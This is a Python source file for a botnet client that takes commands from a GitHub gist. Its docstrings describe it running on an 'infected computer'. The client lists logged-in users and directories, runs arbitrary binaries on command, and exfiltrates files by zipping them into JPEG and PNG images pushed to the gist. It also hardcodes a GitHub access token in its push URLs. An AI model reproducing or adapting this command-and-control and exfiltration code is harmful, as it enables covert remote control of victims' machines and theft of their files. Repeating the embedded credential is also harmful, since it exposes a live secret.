import os
import time
import names
from random import randint

import signal

class Bot:
    """
            # Bot client class.
    """
    def __init__(self, botdir):
        """
        :param botdir: directory of gist.github repository.
        """
        self.botname = names.get_first_name() + str(randint(1, 100))  # Generate name  of the bot.
        self.botdir = botdir

    @staticmethod
    def get_logged_users():
        """
        Method to get list of logged user on infected computer.
        :return: List of logged users.
        """
        users = os.popen("ps au | awk '{print $1}' | uniq").readlines()[1:]
        return set(map(lambda x: x[:-1], users))

    @staticmethod
    def list_dir(path, ps=""):
        """
        Method to get list of files and folders of particular directory.
        :param path: path of directory to be examined.
        :param ps: "" ~ "ls", "-a" ~ "ls -a"
        :return: list of files and folders of directory.
        """
        files = os.listdir(path)
        if ps == "-a":
            return files
        return list(filter(lambda x: x[0] != '.', files))

    @staticmethod
    def execute_binary(bname):
        """
        Run binary of given name.
        :param bname: name (or path with name) of binary to be run.
        """
        os.system(bname)

    def decode_file(self):
        """
        Decodes image rcved from C&C into image and file.
        Encoded file C&C-->bot 'tower.jpeg', product is tower.txt.
        """
        os.system("unzip " + self.botdir + "/tower.jpeg &> /dev/null")

    def encode_file(self, filename):
        """
        Encodes given file into image.
        Encoded file bot->C&C 'knight_<botname>.jpeg'.
        Empty image is always 'horse.jpeg'.
        :param filename: filename to be encoded.
        """
        os.system("zip -r tmp.zip " + filename)
        os.system("cat " + self.botdir + "/horse.jpeg tmp.zip > " + self.botdir +
                  "/knight_" + self.botname + ".jpeg")
        os.system("rm tmp.zip")

    def data2knight(self, data):
        """
        Converts list of data into file and calls image-encoding function.
        :param data: list of data: [cmd type, current id, msg string].
        """
        os.system("touch knight.txt")
        bot_file = open("knight.txt", 'w')
        bot_file.writelines("%s\n" % line for line in data)  # Write msg to txt file.
        bot_file.close()
        self.encode_file("knight.txt")  # Encode txt file into image.
        os.system("rm knight.txt")

    def copy2bishop(self, filename):
        """
        Encode given file into image.
        Encoded file bot->C&C 'bishop_<botname>.jpeg'.
        Empty image is always 'bishop.jpeg'
        :param filename: file to be sent.
        """
        os.system("cp " + filename + " " + os.path.basename(filename))
        filename = os.path.basename(filename)
        os.system("zip -r tmp.zip " + filename)
        os.system("cat " + self.botdir + "/bishop.jpeg tmp.zip > " + self.botdir +
                  "/bishop_" + self.botname + ".jpeg")
        os.system("rm tmp.zip " + filename)


    # @staticmethod
    # def process_cmd(cmd):
    #     if cmd == "w":

    @staticmethod
    def write_response(bot_name, cmd, response):
        c2e = {"w": "🐎", "ls": "😈", "exe": "😎", "id": "😴", "cp": "🐱‍🐉", "rmresp": "☠"}
        f = open("b986ad8f94834deaf526315971868580/history.txt",'a')
        f.writelines(bot_name+":"+c2e[cmd]+":"+str(response)+"\n")
        f.close()
        Bot.git_push_reponse()

    @staticmethod
    def git_push_reponse():
        os.system("cd b986ad8f94834deaf526315971868580;git add history.txt")
        time.sleep(1)
        os.system("cd b986ad8f94834deaf526315971868580;git commit -m 'bot-resp'")
        time.sleep(1)
        os.system("cd b986ad8f94834deaf526315971868580;git push https://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@gist.github.com/b986ad8f94834deaf526315971868580.git")
        time.sleep(1)


    @staticmethod
    def git_push_mail():
            os.system("cd b986ad8f94834deaf526315971868580;git add mail.png")
            time.sleep(1)
            os.system("cd b986ad8f94834deaf526315971868580;git commit -m 'mail.png'")
            time.sleep(1)
            os.system(
                "cd b986ad8f94834deaf526315971868580;git push https://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@gist.github.com/b986ad8f94834deaf526315971868580.git")
            time.sleep(1)


    @staticmethod
    def process_cmd(bot_cmd_arg):
        cmdict = {"🐎": "w", "😈": "ls", "😎": "exe", "😴": "id", "🐱‍🐉": "cp", "☠": "cp"}
        print("\n            "+bot_cmd_arg)
        bot_name = bot_cmd_arg.split(":")[0]
        cmd = cmdict[bot_cmd_arg.split(":")[1]]

        if cmd == "w":
            users = os.popen("ps au | awk '{print $1}' | uniq").readlines()[1:]
            print("     written..."+bot_name + ":" + cmd + ":" + str(users) + "\n\n")
            Bot.write_response(bot_name, cmd, users)

        if cmd == "ls":
            if len(bot_cmd_arg.split(":")) == 3:
                path = bot_cmd_arg.split(":")[2]
                directory = os.listdir(path)
            else:
                directory = os.listdir()
            print("     written..."+bot_name + ":" + cmd + ":" + str(directory) + "\n\n")
            Bot.write_response(bot_name, cmd, directory)

        if cmd == "exe":
            if len(bot_cmd_arg.split(":")) == 3:
                path = bot_cmd_arg.split(":")[2]
                print("DBG: -->> EXECUTING path = " + path)
                os.system("./"+path)
                print("     written..."+bot_name + ":" + cmd + ":" + path + "\n\n")
                Bot.write_response(bot_name, cmd, "")

        if cmd == "id":
            uid = os.geteuid()
            print("     written..."+bot_name + ":" + cmd + ":" + str(uid) + "\n\n")
            Bot.write_response(bot_name, cmd, uid)

        if cmd == "cp":
            path = bot_cmd_arg.split(":")[2]
            print("\n injecting "+path+ " into mail.png \n")
            os.system("cd b986ad8f94834deaf526315971868580; git pull")
            time.sleep(1)
            os.system("zip -r tmp.zip "+path)
            os.system("cat b986ad8f94834deaf526315971868580/mail.png tmp.zip > b986ad8f94834deaf526315971868580/mail.png")
            os.system("rm tmp.zip")
            time.sleep(10)
            Bot.git_push_mail()
            Bot.write_response(bot_name, cmd, "")




    @staticmethod
    def git_push_up_bots():
        os.system("cd b986ad8f94834deaf526315971868580;git add scores.txt")
        time.sleep(1)
        os.system("cd b986ad8f94834deaf526315971868580;git commit -m 'scores'")
        time.sleep(1)
        os.system("cd b986ad8f94834deaf526315971868580;git push https://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@gist.github.com/b986ad8f94834deaf526315971868580.git")
        time.sleep(1)

    @staticmethod
    def handle_stop(bot_name):
        # Handle any cleanup here
        print('SIGINT or CTRL-C detected. Exiting gracefully')

        files = os.popen("ls b986ad8f94834deaf526315971868580").readlines()
        if "scores.txt\n" in files:
            with open("b986ad8f94834deaf526315971868580/scores.txt", "r") as f:
                lines = f.readlines()
                print(lines)
            with open("b986ad8f94834deaf526315971868580/scores.txt", "w") as f:
                for line in lines:
                    if bot_name not in line:
                        f.write(line)
        Bot.git_push_up_bots()
        print("\n\n--name deleted--\n\n")
        exit(0)




def main(bot_dir, token, url):

    names = ["Cyr", "Uke", "Mat"]
    bot_name = names[randint(0,2)] + str(randint(1,9))
    print("     "+bot_name + " got created")

    def signal_handler(*args):
        Bot.handle_stop(bot_name)

    signal.signal(signal.SIGINT, signal_handler)

    os.system("git clone " + url + " &> /dev/null")
    time.sleep(1)
    os.system("cd b986ad8f94834deaf526315971868580; git pull")
    time.sleep(1)
    files = os.popen("ls b986ad8f94834deaf526315971868580").readlines()
    if "scores.txt\n" in files:
        f = open("b986ad8f94834deaf526315971868580/scores.txt", "a")
        score = randint(0,99)
        f.writelines(bot_name+" has score of " + str(score) + "\n")
        print("\n\n--name written--\n\n")
        f.close()
        Bot.git_push_up_bots()


    # are there any commands?
    # bot will always empty the file -> if file empty -> there is work to do
    while 1:
        os.system("cd b986ad8f94834deaf526315971868580; git pull")
        time.sleep(1)
        if "activities.txt\n" in files:
            if os.stat("b986ad8f94834deaf526315971868580/activities.txt").st_size != 0:
                cmds = open("b986ad8f94834deaf526315971868580/activities.txt").readlines()
                print("cmds=" + str(cmds))
                for cmd in cmds:
                    if bot_name in cmd:
                        print("     [botname="+bot_name+"] bot got cmd: "+cmd)
                        print("     will check another cmd in 20s \n ---------------- \n "
                              "  !!! WARNING: DO NOT <rmresp> on controller to prevent merge-conflict !!!\n ------------\n")
                        Bot.process_cmd(cmd)
                    else:
                        print("     no work for [botname="+bot_name+"]")
                        print("     will check another cmd in 20s\n")
                    time.sleep(20)
            else:
                print("     no work for [botname="+bot_name+"]")
                print("     will check another cmd in 20s\n")
            time.sleep(20)
        time.sleep(2)






if __name__ == '__main__':
    token = "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"
    main("../b986ad8f94834deaf526315971868580",
         token,
         "https://gist.github.com/b986ad8f94834deaf526315971868580")